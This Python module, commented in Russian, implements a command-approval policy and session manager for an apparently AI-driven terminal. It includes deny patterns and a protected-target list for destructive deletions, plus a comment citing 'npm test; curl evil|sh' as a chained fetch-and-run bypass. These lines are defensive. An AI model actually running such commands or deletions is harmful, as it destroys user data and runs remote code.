from __future__ import annotations

import asyncio
import os
import re
import shlex
import shutil
import signal
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Awaitable, Callable, Literal

Mode = Literal["sandbox", "project_host", "system_admin"]
Decision = Literal["auto", "ask", "deny"]

DANGEROUS = [
    re.compile(r"(?i)\b(?:format|diskpart|mkfs|fdisk)\b"),
    re.compile(r"(?i)\brm\s+-rf\s+/(?:\s|$)"),
    re.compile(r"(?i)\bgit\s+push\b.*--force"),
    re.compile(r"(?i)\bgit\s+reset\s+--hard\b"),
]
#: Цели, рекурсивное удаление которых необратимо и агенту не нужно НИКОГДА:
#: домашний каталог владельца и корни операционной системы. `rm -rf /` в
#: DANGEROUS был с самого начала, а `rm -rf ~/` и `rm -rf /etc/passwd` — нет,
#: хотя владельцу они стоят ровно столько же (BL-100). Совпадение ТОЧНОЕ:
#: `rm -rf ~/проект/build` — обычная работа и остаётся разрешённой.
#: Записаны В НИЖНЕМ РЕГИСТРЕ: сравнение идёт с приведённой целью, иначе
#: `$HOME` не совпал бы сам с собой.
UNRECOVERABLE_TARGETS = frozenset({
    "/", "~", "$home", "${home}", "%userprofile%", "$userprofile",
    "/home", "/root", "/users", "/etc", "/usr", "/var", "/bin", "/sbin",
    "/lib", "/lib64", "/boot", "/opt", "/srv", "/system", "/library",
    "c:", "c:\\windows", "c:\\users",
})
#: Деревья, внутри которых рекурсивное удаление так же необратимо, как и сам
#: корень: там лежат учётные записи, загрузчик и устройства, и НИ ОДНА
#: владельческая задача туда не пишет.
UNRECOVERABLE_TREES = ("/etc", "/boot", "/sys", "/proc", "/dev")
_RM_WITH_FLAGS = re.compile(r"(?i)\brm\b((?:\s+-{1,2}[a-z][a-z-]*)+)\s+(\S+)")
_RECURSIVE_FLAG = re.compile(r"(?i)(?:\s-[a-z]*r)|--recursive")


def unrecoverable_delete_target(cmd: str) -> str:
    """Цель рекурсивного `rm`, которую стирать нельзя. Пусто — такой цели нет.

    Флаги читаются в любом написании (`-rf`, `-fr`, `-r -f`, `--recursive`):
    порядок букв никогда не был защитой, а выглядел ею.
    """
    for flags, target in _RM_WITH_FLAGS.findall(cmd or ""):
        if not _RECURSIVE_FLAG.search(flags):
            continue
        head = target.strip("'\"").rstrip("/\\").lower() or "/"
        if head in UNRECOVERABLE_TARGETS:
            return target
        if any(head == tree or head.startswith(tree + "/") for tree in UNRECOVERABLE_TREES):
            return target
    return ""


ASK_PATTERNS = [
    re.compile(r"(?i)\bgit\s+push\b"),
    re.compile(r"(?i)\b(?:npm|pnpm|yarn|pip)\s+install\b"),
    re.compile(r"(?i)\bdocker\s+compose\s+(?:up|down|restart)\b"),
    re.compile(r"(?i)\b(?:sudo|runas)\b"),
]
AUTO_PATTERNS = [
    re.compile(r"(?i)^git\s+(?:status|diff|log|show)\b"),
    re.compile(r"(?i)^(?:pytest|python\s+-m\s+pytest)\b"),
    re.compile(r"(?i)^(?:npm|pnpm|yarn)\s+(?:test|run\s+(?:test|lint|build))\b"),
]
# Только для Windows. Когда доступной оболочки `sh` нет и команда уходит в
# cmd.exe, `cat`/`ls` там просто не существуют — читающий эквивалент называется
# `type`/`dir`. Список отдельный, а не дописан в AUTO_PATTERNS, чтобы решение
# политики на Linux осталось ровно прежним: там `dir` и `type` как были ask,
# так и остаются.
AUTO_PATTERNS_NT = [
    re.compile(r"(?i)^(?:type|dir)\b"),
    re.compile(r"(?i)^where\b"),
]


# AUTO_PATTERNS матчатся `re.search` без конца-якоря — они доказывают, что
# командная строка НАЧИНАЕТСЯ с безопасной команды, а не что она СОСТОИТ
# только из неё. `npm test; curl evil|sh` тоже матчит `^npm\s+test\b` и без
# этой проверки ушёл бы в auto: хвост после `;` исполнится тем же host-shell
# без approval. Поэтому auto разрешён только для одиночной команды — без
# конкатенации/подстановки/пайпа.
_SHELL_CHAIN = re.compile(r"[;&|`\n]|\$\(")


def _is_single_command(cmd: str) -> bool:
    """AUTO допустим только для одной команды без chaining/substitution."""
    return not _SHELL_CHAIN.search(cmd)


def auto_patterns() -> list[re.Pattern[str]]:
    """Читающие команды, идущие AUTO, для текущей ОС.

    Считается при вызове, а не при импорте: тест подменяет `os.name` и
    проверяет вторую платформу, не запуская её.
    """
    if os.name == "nt":
        return [*AUTO_PATTERNS, *AUTO_PATTERNS_NT]
    return AUTO_PATTERNS


def host_shell() -> list[str] | None:
    """Как запускать команду НА ХОСТЕ (режимы project_host / system_admin).

    None — через штатный `create_subprocess_shell`, то есть `/bin/sh -c` на
    POSIX. Поведение Linux этим не меняется ни на шаг.

    На Windows `create_subprocess_shell` даёт cmd.exe, где нет ни `cat`, ни
    `ls`, ни `&&`-цепочек в привычном виде: любая команда, написанная моделью
    по-юниксовому, там падает с «не является внутренней или внешней командой».
    Если в PATH есть `sh` (он приходит с Git for Windows и стоит почти у всех,
    кто работает с git), берём его — команды агентов начинают работать так же,
    как на боевой Linux-машине. Если `sh` нет — честно cmd /c, а не отказ.
    """
    if os.name != "nt":
        return None
    sh = shutil.which("sh")
    if sh:
        return [sh, "-lc"]
    return [os.environ.get("COMSPEC") or "cmd.exe", "/c"]


def within(path: Path, roots: list[Path]) -> bool:
    p = path.resolve()
    for root in roots:
        r = root.resolve()
        try:
            p.relative_to(r)
            return True
        except ValueError:
            pass
    return False

@dataclass(slots=True)
class TerminalPolicy:
    allowed_roots: list[Path]
    mode: Mode = "sandbox"

    def decision(self, cmd: str, cwd: Path) -> Decision:
        if not within(cwd, self.allowed_roots):
            return "deny"
        if any(p.search(cmd) for p in DANGEROUS) or unrecoverable_delete_target(cmd):
            return "deny"
        if self.mode == "system_admin":
            # Admin mode is still approval-gated; never silently auto-elevate.
            return "ask"
        if any(p.search(cmd) for p in ASK_PATTERNS):
            return "ask"
        if (self.mode == "project_host" and _is_single_command(cmd)
                and any(p.search(cmd) for p in auto_patterns())):
            return "auto"
        if self.mode == "sandbox":
            return "auto"
        return "ask"

@dataclass
class TerminalSession:
    id: str
    cwd: Path
    cmd: str
    mode: Mode
    proc: asyncio.subprocess.Process
    output: list[str] = field(default_factory=list)
    finished: bool = False
    exit_code: int | None = None
    # F-011: владелец живой сессии (task id). Сессия по session_id доступна
    # только задаче, которая её создала; None = создана владельцем через HTTP.
    owner: str | None = None
    # sandbox: имя контейнера (`--name bcc-<id>`). Без имени `kill` мог сигналить
    # только docker-CLI, а контейнер продолжал работать.
    container: str | None = None
    # Windows: ручка Job Object, в который помещён процесс сессии (None — не вышло
    # или не Windows). Через неё `kill` убивает всё дерево, а не только снимок его.
    job: int | None = None
    _reader: asyncio.Task | None = None

#: Сколько ЗАВЕРШЁННЫХ сессий держать в памяти. Каждая запись удерживает объект
#: процесса, его транспорт и буферы каналов; словарь не чистился никогда.
#: Замер на длинном владельческом прогоне (368 команд подряд): ~5.5 КБ
#: трассируемой кучи на команду не возвращались, и RSS рос линейно — за сутки
#: работы агента это сотни мегабайт. Долговечная история команд лежит в БД
#: (`/api/terminal/sessions`), поэтому вытеснение теряет не историю, а только
#: живой хвост вывода уже закончившейся команды.
RETAIN_FINISHED = 200


# ------------------------------------------------ Windows: Job Object на сессию
#
# `taskkill /T` обходит дерево по снимку «родитель → дети». Git-sh (`sh -lc`) на старте
# делает много fork'ов; ребёнок, родившийся после снимка (или уже осиротевший), остаётся
# жить — `sh.exe` с открытой папкой проекта, который не умирает и держит каталог
# (WinError 32 при удалении). Job Object убивает всех своих участников разом, в том числе
# тех, чей родитель уже мёртв. KILL_ON_JOB_CLOSE НЕ ставится: закрытие ручки ничего не
# убивает, поведение фоновых процессов завершившейся команды прежнее.

_K32: Any = None


def _kernel32() -> Any:
    global _K32
    if _K32 is None:
        import ctypes
        from ctypes import wintypes
        k32 = ctypes.WinDLL("kernel32", use_last_error=True)
        k32.CreateJobObjectW.restype = wintypes.HANDLE
        k32.CreateJobObjectW.argtypes = [ctypes.c_void_p, wintypes.LPCWSTR]
        k32.AssignProcessToJobObject.argtypes = [wintypes.HANDLE, wintypes.HANDLE]
        k32.TerminateJobObject.argtypes = [wintypes.HANDLE, wintypes.UINT]
        k32.CloseHandle.argtypes = [wintypes.HANDLE]
        _K32 = k32
    return _K32


_CREATE_SUSPENDED = 0x00000004


def _win_bind_and_resume(proc: Any) -> int | None:
    """Windows: поместить приостановленный процесс в Job Object и возобновить его.

    Возобновление происходит ВСЕГДА (иначе команда висела бы вечно). Если его не
    удалось выполнить — процесс убивается и бросается OSError: приостановленный
    процесс, о котором никто не знает, хуже честного отказа запуска."""
    if os.name != "nt" or getattr(proc, "_transport", None) is None:
        return None                      # не Windows или двойник процесса в тестах
    job = _win_job_attach(proc)
    try:
        try:
            import psutil
        except ImportError:              # psutil обязателен в зависимостях, но запуск важнее
            import ctypes
            popen = proc._transport.get_extra_info("subprocess")          # noqa: SLF001
            status = ctypes.WinDLL("ntdll").NtResumeProcess(ctypes.c_void_p(int(popen._handle)))  # noqa: SLF001
            if status != 0:
                raise OSError(f"NtResumeProcess: 0x{status & 0xFFFFFFFF:08x}")
        else:
            psutil.Process(proc.pid).resume()
    except Exception as exc:  # noqa: BLE001
        if job is not None:
            _win_job_terminate(job)
            _win_job_close(job)
        try:
            proc.kill()
        except (ProcessLookupError, OSError):
            pass
        raise OSError(f"не удалось возобновить процесс {proc.pid}: {type(exc).__name__}: {exc}") from exc
    return job


def _win_job_attach(proc: Any) -> int | None:
    """Поместить только что запущенный процесс в новый Job Object (Windows, иначе None).

    Любая неудача — None, и `kill` остаётся на `taskkill`: безопасность остановки
    не должна зависеть от того, что ctypes/ручка/вложенные задания доступны."""
    if os.name != "nt":
        return None
    try:
        k32 = _kernel32()
        popen = proc._transport.get_extra_info("subprocess")      # noqa: SLF001
        handle = int(popen._handle)                               # noqa: SLF001
        job = k32.CreateJobObjectW(None, None)
        if not job:
            return None
        if not k32.AssignProcessToJobObject(job, handle):
            k32.CloseHandle(job)
            return None
        return int(job)
    except Exception:  # noqa: BLE001 — фейковый процесс в тестах, нет ctypes и т.п.
        return None


def _win_job_terminate(job: int) -> None:
    try:
        _kernel32().TerminateJobObject(job, 1)
    except Exception:  # noqa: BLE001
        pass


def _win_job_close(job: int) -> None:
    try:
        _kernel32().CloseHandle(job)
    except Exception:  # noqa: BLE001
        pass


#: Вывод завершённой сессии хранится на диске, чтобы он читался и после того, как
#: сессия ушла из памяти (RETAIN_FINISHED) или процесс перезапустили. Предел на
#: файл и на их число — иначе это был бы ещё один «растущий навсегда» каталог.
LOG_CAP_BYTES = 256 * 1024
LOG_TAIL_LINES = 2000
LOG_KEEP_FILES = 500
_SID_RE = re.compile(r"[0-9a-f]{12}")


class TerminalManager:
    def __init__(self, sandbox_image: str = "python:3.12-slim", log_dir: Path | None = None):
        self.sandbox_image = sandbox_image
        self.sessions: dict[str, TerminalSession] = {}
        self.log_dir: Path | None = Path(log_dir) if log_dir else None
        #: Вызывается (await) по завершении процесса сессии: фича пишет итог в БД.
        self.on_finish: Callable[[TerminalSession], Awaitable[None]] | None = None

    async def start(self, cmd: str, cwd: Path, policy: TerminalPolicy,
                    *, approved: bool = False, network: bool = False,
                    owner: str | None = None) -> TerminalSession:
        cwd = cwd.resolve()
        # F-009: единая точка confinement и для host-режимов, и для sandbox —
        # каталог, который уйдёт в `-v cwd:/work`, обязан лежать в разрешённых
        # корнях. Контейнер — защита в глубину, а не замена авторизации пути.
        if not within(cwd, policy.allowed_roots):
            raise PermissionError(f"cwd outside allowed roots: {cwd}")
        decision = policy.decision(cmd, cwd)
        if decision == "deny":
            raise PermissionError("terminal command denied by policy")
        if decision == "ask" and not approved:
            raise PermissionError("terminal command requires approval")

        sid = uuid.uuid4().hex[:12]
        container: str | None = None
        # POSIX: сессия — лидер новой группы процессов (killpg достаёт потомков).
        # Windows: процесс рождается ПРИОСТАНОВЛЕННЫМ, помещается в Job Object и только
        # потом возобновляется — нет мгновения, когда он (или его первый fork) живёт
        # вне задания (тот же приём, что в bcc.studio.providers.sdcpp).
        spawn_kw: dict[str, Any] = ({"creationflags": _CREATE_SUSPENDED} if os.name == "nt"
                                    else {"start_new_session": True})
        if policy.mode == "sandbox":
            # Внутри контейнера оболочка всегда `sh` — образ линуксовый
            # независимо от того, какая ОС на хосте. Хостовой выбор оболочки
            # сюда не относится и относиться не должен.
            container = f"bcc-{sid}"
            docker_args = [
                "docker", "run", "--rm", "--name", container,
                "--network", "bridge" if network else "none",
                "-v", f"{cwd}:/work",
                "-w", "/work",
                self.sandbox_image,
                "sh", "-lc", cmd,
            ]
            proc = await asyncio.create_subprocess_exec(
                *docker_args,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
                **spawn_kw,
            )
        else:
            shell = host_shell()
            # cmd.exe does not use CRT argv escaping: passing the complete
            # command as an exec argument inserts backslashes before quotes.
            # Python's shell launcher supplies cmd /c with its native quoting.
            is_cmd = shell is not None and Path(shell[0]).name.lower() in ("cmd", "cmd.exe")
            if shell is None or is_cmd:
                proc = await asyncio.create_subprocess_shell(
                    cmd, cwd=str(cwd),
                    **({"executable": shell[0]} if is_cmd else {}),
                    **spawn_kw,
                    stdin=asyncio.subprocess.PIPE,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.STDOUT,
                )
            else:
                proc = await asyncio.create_subprocess_exec(
                    *shell, cmd, cwd=str(cwd),
                    **spawn_kw,
                    stdin=asyncio.subprocess.PIPE,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.STDOUT,
                )

        session = TerminalSession(sid, cwd, cmd, policy.mode, proc, owner=owner,
                                  container=container, job=_win_bind_and_resume(proc))
        self.sessions[sid] = session
        session._reader = asyncio.create_task(self._read(session))
        return session

    async def _read(self, s: TerminalSession) -> None:
        assert s.proc.stdout is not None
        import locale

        while True:
            line = await s.proc.stdout.readline()
            if not line:
                break
            try:
                text = line.decode("utf-8")
            except UnicodeDecodeError:
                # Windows-хост: cmd.exe/консольные утилиты пишут в OEM-кодировке
                # (cp866/cp1251), а не в UTF-8 — иначе кириллица превращается
                # в mojibake и вывод теряет смысл.
                text = line.decode(locale.getpreferredencoding(False), errors="replace")
            s.output.append(text.rstrip("\r\n"))
            if len(s.output) > 5000:
                del s.output[:1000]
        s.exit_code = await s.proc.wait()
        s.finished = True
        self._close_job(s)
        self._persist_log(s)
        if self.on_finish is not None:
            try:
                await self.on_finish(s)
            except asyncio.CancelledError:
                raise
            except Exception:  # noqa: BLE001 — итог в БД не должен ронять читателя вывода
                pass

    @staticmethod
    def _close_job(s: TerminalSession) -> None:
        """Отпустить ручку Job Object. Без KILL_ON_JOB_CLOSE: завершившаяся команда,
        оставившая фоновый процесс (`server &`), ведёт себя как раньше."""
        job, s.job = s.job, None
        if job is not None:
            _win_job_close(job)

    # ------------------------------------------------ журнал вывода на диске

    def log_path(self, session_id: str) -> Path | None:
        """Путь журнала сессии. id приходит из URL, поэтому допустимы только 12 hex."""
        if self.log_dir is None or not _SID_RE.fullmatch(str(session_id or "")):
            return None
        return self.log_dir / f"{session_id}.log"

    def _persist_log(self, s: TerminalSession) -> None:
        path = self.log_path(s.id)
        if path is None:
            return
        try:
            path.parent.mkdir(parents=True, exist_ok=True)
            data = "\n".join(s.output[-LOG_TAIL_LINES:]).encode("utf-8", "replace")
            if len(data) > LOG_CAP_BYTES:
                data = "[... начало вывода отброшено ...]\n".encode() + data[-LOG_CAP_BYTES:]
            tmp = path.with_suffix(".tmp")
            tmp.write_bytes(data)
            os.replace(tmp, path)
            self._prune_logs(path.parent)
        except OSError:
            pass                      # журнал — удобство, а не условие работы терминала

    @staticmethod
    def _prune_logs(folder: Path, keep: int = LOG_KEEP_FILES) -> None:
        logs = sorted(folder.glob("*.log"), key=lambda p: p.stat().st_mtime, reverse=True)
        for old in logs[keep:]:
            old.unlink(missing_ok=True)

    def read_log(self, session_id: str) -> list[str] | None:
        """Сохранённый хвост вывода завершённой сессии или None, если журнала нет."""
        path = self.log_path(session_id)
        if path is None or not path.is_file():
            return None
        try:
            return path.read_text(encoding="utf-8", errors="replace").splitlines()
        except OSError:
            return None

    def retire_finished(self, keep: int = RETAIN_FINISHED, *, remove: bool = True) -> list[dict]:
        """Выселить самые старые ЗАВЕРШЁННЫЕ сессии, вернув их итоговый статус.

        Живая сессия не выселяется НИКОГДА, сколько бы их ни накопилось:
        выбросить запись работающего процесса — значит потерять над ним
        контроль, а это хуже любой экономии памяти. Словарь упорядочен по
        времени создания, поэтому уходят именно самые старые.

        remove=False выбирает кандидатов без удаления: HTTP-слой сначала
        сохраняет итог в БД, и только после успешного commit освобождает память.
        """
        finished = [sid for sid, s in self.sessions.items() if s.finished]
        retired: list[dict] = []
        for sid in finished[:max(0, len(finished) - max(0, keep))]:
            retired.append(self.status(sid))
            if remove:
                self.sessions.pop(sid, None)
        return retired

    def status(self, session_id: str) -> dict:
        s = self.sessions[session_id]
        return {
            "id": s.id,
            "cwd": str(s.cwd),
            "cmd": s.cmd,
            "mode": s.mode,
            "pid": s.proc.pid,
            "finished": s.finished,
            "exit_code": s.exit_code,
            "output_tail": s.output[-200:],
        }

    async def write_stdin(self, session_id: str, text: str) -> None:
        s = self.sessions[session_id]
        if s.proc.stdin is None or s.finished:
            raise RuntimeError("stdin unavailable")
        s.proc.stdin.write(text.encode())
        await s.proc.stdin.drain()

    async def _docker_kill(self, s: TerminalSession) -> None:
        """Остановить КОНТЕЙНЕР песочницы.

        SIGKILL/taskkill по docker-CLI контейнеру не пересылается: клиент умирает,
        а контейнер с командой владельца живёт дальше. Поэтому `docker kill <имя>`.
        Ошибка (контейнер уже вышел, демон недоступен) — не сбой остановки: CLI
        добивается ниже."""
        if not s.container:
            return
        killer = None
        try:
            killer = await asyncio.create_subprocess_exec(
                "docker", "kill", s.container,
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT)
            await asyncio.wait_for(killer.communicate(), timeout=15)
        except (OSError, asyncio.TimeoutError):
            if killer is not None and killer.returncode is None:
                try:
                    killer.kill()
                except ProcessLookupError:
                    pass
            return
        if s.proc.returncode is None:
            try:
                await asyncio.wait_for(s.proc.wait(), timeout=5)
            except asyncio.TimeoutError:
                pass

    async def kill_all(self) -> list[str]:
        """Остановить все живые сессии (остановка сервисов). Возвращает их id."""
        ids = [sid for sid, s in self.sessions.items() if not s.finished]
        for sid in ids:
            try:
                await self.kill(sid)
            except Exception:  # noqa: BLE001 — остальные сессии всё равно останавливаем
                pass
        return ids

    async def kill_owned(self, owner: str) -> list[str]:
        """Остановить живые сессии одной задачи (per-task STOP). Возвращает их id."""
        ids = [sid for sid, s in self.sessions.items() if not s.finished and s.owner == owner]
        for sid in ids:
            try:
                await self.kill(sid)
            except Exception:  # noqa: BLE001
                pass
        return ids

    async def kill(self, session_id: str) -> None:
        s = self.sessions[session_id]
        if not s.finished:
            await self._docker_kill(s)
            # A host shell can have an active child. Killing only cmd.exe/sh
            # leaves that child running after the owner sees "stopped".
            if os.name == "nt" and s.proc.returncode is None:
                # Job Object убивает ВСЁ дерево разом, включая потомков, рождённых
                # после того, как `taskkill /T` сделал снимок дерева. Git-sh на старте
                # (login-профиль) десятки раз делает fork: STOP в эти первые сотни
                # миллисекунд оставлял осиротевшие `sh.exe` (13% попыток из 60 на
                # измерении 2026-09-30) с открытой рабочей папкой проекта, а сам
                # taskkill падал «не удалось завершить процесс … дочерний процесс».
                if s.job is not None:
                    _win_job_terminate(s.job)
                    try:
                        await asyncio.wait_for(s.proc.wait(), timeout=5)
                    except asyncio.TimeoutError:
                        pass
                if s.proc.returncode is None:
                    killer = await asyncio.create_subprocess_exec(
                        "taskkill", "/PID", str(s.proc.pid), "/T", "/F",
                        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT)
                    output, _ = await killer.communicate()
                    if killer.returncode and s.proc.returncode is None:
                        # Процесс мог умереть сам, пока taskkill обходил дерево.
                        try:
                            await asyncio.wait_for(s.proc.wait(), timeout=2)
                        except asyncio.TimeoutError:
                            pass
                        if s.proc.returncode is None:
                            raise RuntimeError(
                                f"process tree stop failed: {output.decode(errors='replace')[:200]}")
            elif s.proc.returncode is None:
                # POSIX starts each session in its own process group above.
                try:
                    os.killpg(s.proc.pid, signal.SIGKILL)
                except ProcessLookupError:
                    pass
            await s.proc.wait()
            s.finished = True
            s.exit_code = s.proc.returncode
            self._close_job(s)
